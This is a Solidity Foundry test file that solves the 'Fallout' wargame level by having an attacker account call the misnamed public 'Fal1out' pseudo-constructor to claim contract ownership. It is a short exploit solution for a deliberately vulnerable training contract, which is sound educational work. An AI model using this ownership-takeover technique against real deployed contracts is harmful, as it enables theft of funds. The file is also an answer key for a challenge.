// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./utils/BaseTest.sol";
import "../src/levels/2-Fallout/Fallout.sol";
import "../src/levels/2-Fallout/FalloutFactory.sol";

contract FalloutTest is Test, BaseTest {
    Fallout public level;

    constructor() {
        levelFactory = new FalloutFactory();
    }

    function setUp() public override {
        super.setUp();
        levelAddr = payable(_createLevelInstance());
        level = Fallout(levelAddr);
    }

    function testAttack() public {
        _attack();
        _validateLevel();
    }

    function _attack() public override {
        vm.startPrank(attacker);

        // 1. Initialize the contract & claim ownership
        level.Fal1out{value: 0.0001 ether}();

        vm.stopPrank();
    }
}
